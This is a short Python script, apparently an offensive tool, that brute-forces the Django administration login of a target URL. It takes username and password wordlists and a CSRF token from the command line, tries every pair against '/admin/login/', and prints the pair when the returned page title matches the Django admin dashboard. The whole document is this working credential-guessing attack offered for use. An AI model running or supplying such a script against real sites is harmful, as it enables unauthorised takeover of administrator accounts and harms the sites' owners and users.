#!/usr/bin/env python3
import requests
import argparse
from bs4 import BeautifulSoup
parser = argparse.ArgumentParser(description='Bruteforce HTTP')
parser.add_argument("-u","--url", help="Enter the target URL ",dest="URL", action="store", required=True)
parser.add_argument("-l","--ulist", help="specify the username wordlist", dest="ulist",action="store", required=True)
parser.add_argument("-p","--plist", help="specify the password wordlist", dest="plist",action="store", required=True)
parser.add_argument("-t","--token", help="specify the CSRF token",dest="CSRF",action="store", required=False)
results = parser.parse_args()
uname_words= open(results.ulist, "r")
passwd_words= open(results.plist, "r")
session = requests.session()
url= results.URL.strip()
for x in uname_words:
	x=x.strip()
	for x2 in passwd_words:
		x2=x2.strip()
		payload= {
        "csrfmiddlewaretoken":results.CSRF,
		"username": x,
		"password": x2 ,
		"submit":"Log in" 
		}
		cookies = {'csrftoken': results.CSRF}
		PostRequest = requests.post(url+"/admin/login/?next=/admin/", data=payload, cookies=cookies)
		soup= BeautifulSoup(PostRequest.text,'html.parser')
		if soup.title.text=="Site administration | Django site admin":
			print("found!!")
			print("username: "+x)
			print("password: "+x2)
	passwd_words.seek(0)
uname_words.close()
passwd_words.close()
session.close()